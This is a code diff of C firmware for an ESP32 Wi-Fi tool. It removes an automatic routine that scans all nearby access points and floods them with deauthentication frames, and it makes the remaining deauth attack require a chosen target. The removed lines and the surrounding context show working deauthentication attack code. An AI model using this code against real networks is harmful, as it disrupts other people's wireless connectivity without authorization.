@@ -59,11 +59,9 @@ static bool deauth_task_running = false;
 static volatile bool deauth_stop_requested = false;
 static volatile bool deauth_station_stop_requested = false;
 
-// Station selection (local to this module for station deauth)
 static station_ap_pair_t selected_station_local;
 static bool station_selected_local = false;
 
-// Selected AP tracking (local copies)
 static wifi_ap_record_t selected_ap_local;
 static wifi_ap_record_t *selected_aps_local = NULL;
 static int selected_ap_count_local = 0;
@@ -126,7 +124,6 @@ static const uint8_t disassoc_packet_template[26] = {
 // Forward declarations
 static void deauth_task(void *param);
 static void deauth_station_task(void *param);
-static void auto_deauth_task(void *Parameter);
 
 esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     // Use HT40 for 5GHz channels on dual-band chips - but use NONE as secondary
@@ -282,34 +279,6 @@ static void deauth_task(void *param) {
                     vTaskDelay(pdMS_TO_TICKS(10));
                 }
             }
-        } else {
-            for (size_t ch_idx = 0; ch_idx < wireshark_channels_count; ch_idx++) {
-                int ch = wireshark_channels[ch_idx];
-                bool channel_set = false;
-                for (int i = 0; i < ap_count; i++) {
-                    if (ap_info[i].primary == ch) {
-                        if (!channel_set) {
-                            wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-                            if (ch > 14) sec = WIFI_SECOND_CHAN_ABOVE;
-#endif
-                            esp_wifi_set_channel(ch, sec);
-                            channel_set = true;
-                        }
-                        for (int burst = 0; burst < 25; burst++) {
-                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
-                        }
-                        for (int j = 0; j < station_count; j++) {
-                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                                for (int burst = 0; burst < 25; burst++) {
-                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
-                                }
-                            }
-                        }
-                    }
-                }
-                if (channel_set) vTaskDelay(pdMS_TO_TICKS(5));
-            }
         }
         vTaskDelay(pdMS_TO_TICKS(10));
         uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
@@ -395,10 +364,15 @@ void deauth_attack_start(void) {
             status_display_show_attack("Deauth", sanitized_ssid);
 #endif
         } else {
-            glog("Starting global deauth attack on all APs\n");
+            glog("No AP selected. Select a target AP before starting deauth.\n");
+            TERMINAL_VIEW_ADD_TEXT("No AP selected. Select a target AP before starting deauth.\n");
 #ifdef CONFIG_WITH_STATUS_DISPLAY
-            status_display_show_attack("Deauth", "all APs");
+            status_display_show_status("No AP Selected");
 #endif
+            rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
+            esp_wifi_stop();
+            ap_manager_start_services();
+            return;
         }
         
         deauth_stop_requested = false;
@@ -559,80 +533,8 @@ bool deauth_attack_stop_station(void) {
     return false;
 }
 
-static void auto_deauth_task(void *Parameter) {
-    while (1) {
-        wifi_scan_config_t scan_config = {
-            .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true};
-
-        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
-        vTaskDelay(pdMS_TO_TICKS(1500));
-        esp_wifi_scan_stop();
-
-        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
-
-        if (ap_count > 0) {
-            scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
-            if (scanned_aps == NULL) {
-                printf("Failed to allocate memory for AP info\n");
-                continue;
-            }
-
-            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
-            glog("\nFound %d access points\n", ap_count);
-        } else {
-            glog("\nNo access points found\n");
-            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait before retrying if no APs found
-            continue;
-        }
-
-        wifi_ap_record_t *ap_info = scanned_aps;
-        if (ap_info == NULL) {
-            printf("Failed to allocate memory for AP info\n");
-            return;
-        }
-
-        for (int z = 0; z < 50; z++) {
-            for (int i = 0; i < ap_count; i++) {
-                for (int y = 1; y < 12; y++) {
-                    int retry_count = 0;
-                    esp_err_t err;
-                    while (retry_count < 3) {
-                        err = esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
-                        if (err == ESP_OK) {
-                            break;
-                        }
-                        printf("Failed to set channel %d, retry %d\n", y, retry_count + 1);
-                        vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between retries
-                        retry_count++;
-                    }
-
-                    if (err != ESP_OK) {
-                        printf("Failed to set channel after retries, skipping...\n");
-                        continue; // Skip this channel if all retries failed
-                    }
-
-                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                    deauth_attack_broadcast(ap_info[i].bssid, y, broadcast_mac);
-                    for (int j = 0; j < station_count; j++) {
-                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                            deauth_attack_broadcast(ap_info[i].bssid, y, station_ap_list[j].station_mac);
-                        }
-                    }
-                    vTaskDelay(pdMS_TO_TICKS(50));
-                }
-                vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between APs
-            }
-            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between cycles
-        }
-
-        free(scanned_aps);
-        vTaskDelay(pdMS_TO_TICKS(1000)); // 1000ms delay before starting next scan
-    }
-}
-
 void deauth_attack_auto(void) {
-    printf("Starting auto deauth transmission...\n");
-    auto_deauth_task(NULL);
+    deauth_attack_start();
 }
 
 uint32_t deauth_attack_get_packets_sent(void) {
